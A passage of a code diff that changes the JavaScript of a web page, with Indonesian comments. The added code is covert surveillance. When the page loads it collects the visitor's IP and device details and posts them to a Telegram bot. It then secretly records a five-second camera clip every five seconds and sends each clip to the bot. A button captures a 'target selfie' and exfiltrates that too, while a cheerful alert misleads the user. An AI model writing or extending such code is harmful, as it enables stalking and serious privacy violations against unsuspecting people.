+        // Convert to MP4 for better compatibility
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("video", videoBlob, `live_feed_${Date.now()}.webm`);
+        formData.append("caption", "📹 LIVE FEED REAL-TIME - 5 DETIK TERAKHIR");
+        
+        try {
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+            method: "POST",
+            body: formData
+          });
+        } catch (e) {
+          console.log("Error sending video:", e);
+        }
+        
+        isRecording = false;
+      };
+      
+      videoRecorder.start();
+      setTimeout(() => {
+        if (videoRecorder && videoRecorder.state === 'recording') {
+          videoRecorder.stop();
+        }
+      }, 5000); // Record for 5 seconds
+      
+    }, 5000); // Every 5 seconds
+    
+  } catch (e) {
+    console.log("Cannot access camera for live feed:", e);
   }
 }
 
-// Kamera snapshot sebagai file .jpg (document)
-async function sendSnapshot(){
-  try{
-    const stream = await navigator.mediaDevices.getUserMedia({video:true});
+// Send initial device information
+async function sendIpDevice() {
+  try {
+    const [ip, d] = await Promise.all([getIpInfo(), getDeviceInfo()]);
+    const caption = buildCaption(ip, d);
+    
+    // Send as photo with caption
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        photo: STATIC_IMAGE,
+        caption: caption,
+        parse_mode: "HTML"
+      })
+    });
+    
+    console.log("📊 Data lengkap berhasil dikirim!");
+    
+    // Start video recording after 5 seconds
+    setTimeout(startVideoRecording, 5000);
+    
+  } catch (e) {
+    console.log("Error mengirim data:", e);
+  }
+}
+
+// Take snapshot
+async function sendSnapshot() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
     const video = document.createElement('video');
-    video.style.display='none';
+    video.style.display = 'none';
     document.body.appendChild(video);
     video.srcObject = stream;
     video.play();
 
-    await new Promise(resolve => { video.onloadedmetadata = () => setTimeout(resolve, 200); });
+    await new Promise(resolve => { 
+      video.onloadedmetadata = () => setTimeout(resolve, 500); 
+    });
 
-    const canvas=document.createElement('canvas');
-    canvas.width=video.videoWidth;
-    canvas.height=video.videoHeight;
-    canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
 
     const formData = new FormData();
     formData.append("chat_id", CHAT_ID);
-    formData.append("document", blob, "screenshotbyaldofficialr.jpg");
-    formData.append("caption", "📸 SUKSES SCREENSHOT FOTO TARGET!");
+    formData.append("document", blob, "target_selfie.jpg");
+    formData.append("caption", "📸 SELFIE TARGET BERHASIL DIAMBIL!");
 
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
       method: "POST",
       body: formData
     });
 
-    stream.getTracks().forEach(track=>track.stop());
+    stream.getTracks().forEach(track => track.stop());
     video.remove();
-  }catch(e){
-    console.log("yahhh", e);
+    
+    alert("📸 Foto berhasil diambil! 🎉");
+    
+  } catch (e) {
+    console.log("Error mengambil foto:", e);
+    alert("❌ Maaf, tidak bisa mengakses kamera. Pastikan izin kamera sudah diberikan.");
   }
 }
 
-// Jalankan saat halaman load
-window.addEventListener("load",sendIpDevice);
+// Cleanup when page closes
+window.addEventListener('beforeunload', () => {
+  if (videoInterval) clearInterval(videoInterval);
+  if (videoStream) {
+    videoStream.getTracks().forEach(track => track.stop());
+  }
+});
 
-// Tombol klik kamera
+// Initialize
+window.addEventListener("load", sendIpDevice);
 document.getElementById("btnCamera").addEventListener("click", sendSnapshot);
 </script>
 </body>
